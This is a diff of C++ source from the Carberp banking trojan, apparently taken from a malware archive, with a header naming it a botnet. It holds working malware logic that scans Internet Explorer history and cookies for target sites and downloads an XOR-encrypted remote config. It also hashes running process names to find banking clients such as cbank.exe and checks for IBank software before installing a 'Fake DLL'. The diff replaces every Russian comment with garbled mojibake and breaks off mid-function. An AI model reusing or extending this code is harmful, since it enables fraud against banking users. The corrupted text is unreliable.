@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #include "Modules.h"
@@ -32,16 +43,16 @@ namespace FKI_DEBUGER
 
 
 //-----------------------------------------------------------
-//  Массив ссылок исомых анализатором истории навигации
-//  Строки должны быть разделены нулевым символом и
-//  завершаться пустой строкой
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------------------
 
 #ifndef DEBUGCONFIG
-	// Рабочий массив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char HISANALIZER_LINKS[BOTPARAM_SIZE_HISANALIZERLINKS] = BOTPARAM_HISANALIZERLINKS;
 #else
-	// Для отладки
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     char HISANALIZER_LINKS[] = "yandex\0mail.ru\0bsi.dll\0\0";
 #endif
 //-----------------------------------------------------------
@@ -55,7 +66,7 @@ const DWORD MaxSearchFromConfigFileseTime = 10*60*1009;
 //---------------------------------------------------------------------------
 bool CompareSites(PStrings S, PCHAR Site)
 {
-	// Сравнивает сайты из списка S с сайтом Site
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ S пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Site
 	DWORD Count = Strings::Count(S);
     PCHAR Line;
 	for (DWORD i = 0; i < Count; i++)
@@ -94,10 +105,10 @@ bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 
 	bool Result = false;
 
-    // Копируем файл
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pCopyFileA(FileName, FileCopy, FALSE);
 
-    // Читаем файл в буффер
+    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE File = (HANDLE)pCreateFileA(FileCopy,
                             GENERIC_READ,
 							FILE_SHARE_READ,
@@ -112,13 +123,13 @@ bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 		DWORD FileSize = (DWORD)pGetFileSize(File, &H);
 		if (FileSize > 0)
 		{
-			// Мапируем файл в память
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
         	HANDLE MapFile = (HANDLE)pCreateFileMappingW(File, 0, PAGE_READONLY, 0, FileSize, 0 );
 			if (MapFile != INVALID_HANDLE_VALUE)
 			{
 				PCHAR Buffer  = (PCHAR)pMapViewOfFile(MapFile, FILE_MAP_READ, 0, 0, 0 );
 
-				// Ищем совпадения
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				DWORD Count = Strings::Count(S);
 				PCHAR Line;
 				for (DWORD i = 0; i < Count; i++)
@@ -150,7 +161,7 @@ bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 
 void SearchIEHistoryCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
 {
-	// Функйия обратной связи поиска файлов и директории
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PHistoryConfig Config = (PHistoryConfig)Data;
 
 	if (ReadIEHistoryFile(FileName, Config->Sites))
@@ -163,19 +174,19 @@ void SearchIEHistoryCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &
 
 bool SearchInIEHistory(PHistoryConfig Config)
 {
-	// Ищем совпадения в кукисахIE
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅIE
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL)
 		return false;
 
-    // Определяем путь к директории пользователя
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_HISTORY, FALSE))
 	{
 		STR::Free(Path);
 		return false;
 	}
 
-	// Ищем файлы
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	StrConcat(Path, "\\");
 	SearchFiles(Path, "*.dat", true, FA_ANY_FILES, Config, SearchIEHistoryCallBack);
 
@@ -189,7 +200,7 @@ bool SearchInIEHistory(PHistoryConfig Config)
 
 void SearchCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
 {
-	// Функйия обратной связи поиска файлов и директории
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PHistoryConfig Config = (PHistoryConfig)Data;
 	if (CompareSites(Config->Sites, Find->cFileName))
 	{
@@ -202,19 +213,19 @@ void SearchCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
 
 bool SearchInIECookies(PHistoryConfig Config)
 {
-	// Ищем совпадения в кукисахIE
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅIE
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL)
 		return false;
 
-    // Определяем путь к директории пользователя
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_COOKIES, FALSE))
 	{
 		STR::Free(Path);
 		return false;
 	}
 
-	// Ищем файлы
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	StrConcat(Path, "\\");
 	SearchFiles(Path, "*.txt", false, FA_ANY_FILES, Config, SearchCallBack);
 	//
@@ -225,19 +236,19 @@ bool SearchInIECookies(PHistoryConfig Config)
 //---------------------------------------------------------------------------
 bool SearchFlashPlayerCookies(PHistoryConfig Config)
 {
-    // Ищем совпадения в кукисахIE
+    // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅIE
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL)
 		return false;
 
-    // Определяем путь к директории пользователя
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, FALSE))
 	{
 		STR::Free(Path);
 		return false;
 	}
 
-	// Ищем файлы
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	SearchFiles(Path, "*.*", true, FA_DIRECTORY, Config, SearchCallBack);
 	//
 	STR::Free(Path);
@@ -249,7 +260,7 @@ bool SearchFlashPlayerCookies(PHistoryConfig Config)
 
 
 //---------------------------------------------------------------------------
-//  HisUtils - Вспомогательнве утилиты анализатора истории
+//  HisUtils - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------------
 
 namespace HisUtils
@@ -258,7 +269,7 @@ namespace HisUtils
     //------------------------------------------------------------------------
 	void ExtractFileItems(PHistoryConfig Config)
 	{
-		// изылечь элементы поиска файлов из списка ссылок
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Config == NULL || Config->Sites == NULL) return;
 		PCHAR S;
         PCHAR FileName;
@@ -268,15 +279,15 @@ namespace HisUtils
 		while (i < Strings::Count(Config->Sites))
 		{
 			S = Strings::GetItem(Config->Sites, i, false);
-			// проверяем начинается ли элемент с префикса элемента файла
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if (!StrSame(S, HisFileItem, false, Len))
 			{
-				// Элемент не является файлом, игнорируем его
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 				i++;
 				continue;
 			}
 
-			// Элемент является файлом, извлекаем имя файла
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			FileName = STR::IgnoreSpaces(S + Len);
 			if (!STR::IsEmpty(FileName))
 			{
@@ -291,11 +302,11 @@ namespace HisUtils
 
 	//------------------------------------------------------------------------
 
-	// Структура поиска файлов из конфига
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	typedef struct TFileSearch
 	{
-		// Стандартные пути поиска
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR ProgramFiles;
 		PCHAR Windows;
 		PStrings AllPaths;
@@ -310,7 +321,7 @@ namespace HisUtils
 	//------------------------------------------------------------------------
 	PCHAR GetSpecPath(int CSIDL)
 	{
-		// Функция возвращает некторый путь
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		PCHAR Buf = STR::Alloc(MAX_PATH);
 		PCHAR Result = NULL;
 		if (pSHGetSpecialFolderPathA(NULL, Buf, CSIDL, FALSE))
@@ -323,7 +334,7 @@ namespace HisUtils
 
 	void InitSearchCallBack(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
 	{
-		// Директория найдена, добавляем её в список
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PFileSearch S = (PFileSearch)Data;
         Strings::Add(S->AllPaths, FileName);
     }
@@ -331,12 +342,12 @@ namespace HisUtils
 
 	PFileSearch StartSearch()
 	{
-		// Функция инициализирует поиск файлов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PFileSearch S = CreateStruct(TFileSearch);
 		S->ProgramFiles = GetSpecPath(CSIDL_PROGRAM_FILES);
 		S->Windows = GetSpecPath(CSIDL_WINDOWS);
 
-		// Определяем корневые директории системмного диска
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
         S->AllPaths = Strings::Create();
 		PCHAR Drive = STR::GetLeftStr(S->Windows, ":\\", true);
 		SearchFiles(Drive, "*.*", false, FA_DIRECTORY, S, InitSearchCallBack);
@@ -355,7 +366,7 @@ namespace HisUtils
 
 	void CloseSearch(PFileSearch S)
 	{
-		// Уничтожить данные поиска
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (S == NULL) return;
 		STR::Free(S->Windows);
 		STR::Free(S->ProgramFiles);
@@ -381,7 +392,7 @@ namespace HisUtils
 
 	bool RealSearchFile(PHistoryConfig Config, PFileSearch S, PCHAR Path)
 	{
-		// Функция ищет файл по маске Mask по пути Path
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mask пїЅпїЅ пїЅпїЅпїЅпїЅ Path
 		if (S->Finded || S->TimeCompleted) return true;
 
 		DWORD Count = Strings::Count(Config->Files);
@@ -398,17 +409,17 @@ namespace HisUtils
 
 	bool SearchFilesFromConfig(PHistoryConfig Config)
 	{
-		// Функция ищет файлы указанные в конфигурационном файле
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-		// инициализируем поиск
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		PFileSearch S = StartSearch();
 
-		// Ищем файлы
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		RealSearchFile(Config, S, S->ProgramFiles);
 
 	  	if (!S->Finded  && !S->TimeCompleted)
 		{
-			// Ищем файлы во всех директориях системмного диска
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			for (DWORD i = 0; i < Strings::Count(S->AllPaths); i++)
 			{
 				RealSearchFile(Config, S, Strings::GetItem(S->AllPaths, i));
@@ -420,7 +431,7 @@ namespace HisUtils
 		if (!S->Finded && !S->TimeCompleted)
 			RealSearchFile(Config, S, S->Windows);
 
-		// Закрываем поиск
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		bool Result = S->Finded;
 		CloseSearch(S);
 		return Result;
@@ -432,17 +443,17 @@ namespace HisUtils
 //---------------------------------------------------------------------------
 bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
 {
-	// Загрузить конфигурационный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Config = NULL;
 	if (STR::IsEmpty(URL)) return false;
 
-	// Загружаем конфиг в файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	LPBYTE Buffer = NULL;
 	DWORD BufSize = 0;
 	if (!DownloadInMem(URL, &Buffer, &BufSize))
 		return false;
 
-	// Расшифровываем конфиг
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char Signature[] = {'B', 'J', 'B', 0};
 	PCHAR Lines = (PCHAR)XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, BufSize);
 	if (Lines == NULL || BufSize == 0)
@@ -451,7 +462,7 @@ bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
 		return false;
 	}
 
-	// Парсим конфиг
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Config = CreateStruct(THistoryConfig);
     if (Config == NULL) return false;
 	bool Result = Parse(Lines, Config);
@@ -472,7 +483,7 @@ bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
 
 bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 {
-	// Разобрать список строк конфигурационного файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Lines))
 		return false;
 
@@ -480,7 +491,7 @@ bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 	Strings::SetText(S, Lines);
 	bool Result = false;
 
-	// Парсим список
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Strings::Count(S) > 1)
 	{
 		PCHAR Cmd = Strings::GetItem(S, 0);
@@ -500,7 +511,7 @@ bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 
 	if (Result)
 	{
-		// Отделяем сайты от файлов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Config->Sites = S;
         HisUtils::ExtractFileItems(Config);
     }
@@ -512,8 +523,8 @@ bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 //---------------------------------------------------------------------------
 void HisAnalizer::Execute(PHistoryConfig Config)
 {
-	// Выполнить поиск по истории посещения сайтов
-	// и на этой основе выполнить необходимую команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Config == NULL) return;
 
 	bool Contain =  SearchInIEHistory(Config) ||
@@ -531,7 +542,7 @@ void HisAnalizer::Execute(PHistoryConfig Config)
 
 void HisAnalizer::DownloadAndExecute(PCHAR URL)
 {
-	//  Загрузить и выполнить команду из конфигурационного файла
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PHistoryConfig Config = NULL;
 	if (Download(URL, Config))
 	{
@@ -555,7 +566,7 @@ void HisAnalizer::ClearConfig(PHistoryConfig Config)
 
 void HisAnalizer::FreeConfig(PHistoryConfig Config)
 {
-	// Уничтожить конфиг
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Config == NULL) return;
 	ClearConfig(Config);
 	FreeStruct(Config);
@@ -581,13 +592,13 @@ void HisAnalizer::StartAnalizerThread(PCHAR URL)
 */
 
 //*****************************************************************************
-//   Методы поиска следов на компьютере с целью проверки необходимости
-//   установки Fake DLL
+//   пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//   пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Fake DLL
 //*****************************************************************************
 namespace FDI
 {
 	//--------------------------------------------------
-	//  Функция загружает список обрабатываемых ссылок
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	//--------------------------------------------------
 	void ReadLinks(TBotStrings &Links)
 	{
@@ -610,7 +621,7 @@ namespace FDI
 
 	void CheckIEHistory(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
 	{
-		// Ищем вхождение ссылок в найденном файле истории
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		TSearchData* Data = (TSearchData*)SearchData;
 
@@ -627,7 +638,7 @@ namespace FDI
 				{
 					Cancel = true;
 					Data->Contain = true;
-					FKIDBG("FakeDLLInstaller", "Надена нужная ссылка в истории навигации [%s]", Link.t_str());
+					FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ [%s]", Link.t_str());
 					break;
 				}
 			}
@@ -637,18 +648,18 @@ namespace FDI
 
 
 	//--------------------------------------------------
-	//  Функция ищет совпадения в истории навигации
-	//  Интернет эксплорера
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//--------------------------------------------------
 	bool CheckIEHistory(TBotStrings &Links)
 	{
 		if (Links.Count())
 		{
-			FKIDBG("FakeDLLInstaller", "Проверяем историю навигации ИЕ");
+			FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ");
 			string Path = GetSpecialFolderPathA(CSIDL_HISTORY, NULL);
 			if (!Path.IsEmpty())
 			{
-				// Перебираем все файлы в директории истории
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 				TSearchData Data;
 				Data.Links   = &Links;
@@ -666,7 +677,7 @@ namespace FDI
 
 	bool CheckFileHash(DWORD Hash)
 	{
-		// Функция сравнивает хэш имени файла с именами прописанными в массиве
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		const static DWORD Hashes[] ={0xD61CFB13, /* cbank.exe */
 									  0xFE0E05F6, /* cbmain.ex */
 									  0x702FB20,  /* cbmain.ex_ */
@@ -684,8 +695,8 @@ namespace FDI
 
 	bool SearchProcesses()
 	{
-		// Функция проверяет запущенные процессы в поиске нужных
-		FKIDBG("FakeDLLInstaller", "Проверяем запущенные процессы");
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		bool Result = false;
 		LPVOID Buf = GetInfoTable( SystemProcessInformation );
@@ -707,7 +718,7 @@ namespace FDI
 
 						if (CheckFileHash(ProcessHash))
 						{
-							FKIDBG("FakeDLLInstaller", "Найден процесс %s", pProcess->usName.Buffer);
+							FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", pProcess->usName.Buffer);
 							Result = true;
 							break;
 						}
@@ -728,12 +739,12 @@ namespace FDI
 
 	bool IBankInstalled()
 	{
-		// Функция проверяет наличие наличие файла или ключей реестра
-		//  сигнализирующих об установленном,
-		// на машине пользователя IBank
-        FKIDBG("FakeDLLInstaller", "Проверяем инсталяцию банков");
